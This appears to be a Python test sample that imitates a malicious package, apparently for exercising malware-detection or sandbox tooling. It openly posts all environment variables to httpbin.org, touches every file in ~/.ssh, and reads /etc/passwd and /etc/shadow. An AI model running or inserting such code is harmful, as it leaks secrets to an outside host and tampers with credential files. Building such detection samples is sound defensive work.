import http.client
import json
import os

# Sends an HTTPS post request and prints out the response.
# Exfiltrates environment variables.
def send_https_post_request(called_from: str, print_logs: bool) -> None:
  host = "www.httpbin.org"
  conn = http.client.HTTPSConnection(host)
  data = {"text": f"Sending data through HTTPS from: {called_from}. Found environment variables: {str(os.environ)}"}
  json_data = json.dumps(data)
  conn.request("POST", "/post", json_data, headers={"Host": host})
  response = conn.getresponse()
  if print_logs:
    print(response.read().decode())


# Access ssh keys and attempts to read and write to them.
def access_ssh_keys(called_from: str, print_logs: bool) -> None:
    ssh_keys_directory_path = os.path.join(os.path.expanduser('~'), ".ssh")
    if os.path.isdir(ssh_keys_directory_path):
      try:
        files_in_ssh_keys_directory = os.listdir(ssh_keys_directory_path)
        for file_name in files_in_ssh_keys_directory:
          full_file_path = os.path.join(ssh_keys_directory_path, file_name)
          original_file_data = ""
          with open(full_file_path, "r") as f:
            original_file_data += f.read()
          with open(full_file_path, "a") as f:
            f.write("\nWriting to files in ~/.ssh from: " + called_from)
          # Reset the original state of the files.
          with open(full_file_path, "w") as f:
            f.write(original_file_data)
        if print_logs:
          print("Files in ssh keys directory", files_in_ssh_keys_directory)
      except Exception as e:
        # Fail gracefully to allow execution to continue.
        if print_logs:
          print(f"An exception occurred when calling access_ssh_keys: {str(e)}")
    elif print_logs:
      print("Could not locate ssh key directory.")

def read_file_and_log(file_to_read: str, called_from: str, print_logs: bool) -> None:
  if os.path.isfile(file_to_read):
    try:
      with open(file_to_read, "r") as f:
        file_lines = f.readlines()
        if print_logs:
          print("Read " + file_to_read + " from: " + called_from + ". Lines: " + str(len(file_lines)))
    except Exception as e:
      # Fail gracefully to allow execution to continue.
      if print_logs:
        print(f"An exception occurred when calling read_file_and_log: {str(e)}")

def access_passwords(called_from: str, print_logs: bool) -> None:
  password_file = os.path.join(os.path.abspath(os.sep), "etc", "passwd")
  shadow_password_file = os.path.join(os.path.abspath(os.sep), "etc", "shadow")
  read_file_and_log(password_file, called_from, print_logs)
  # Requires root to read.
  read_file_and_log(shadow_password_file, called_from, print_logs)

# Collection of functionalities to run that can be customized.
https_functions = [send_https_post_request]
access_credentials_functions = [access_ssh_keys, access_passwords]

def main():
  [f("main function", True) for f in https_functions + access_credentials_functions]

if __name__ == "__main__":
  main()
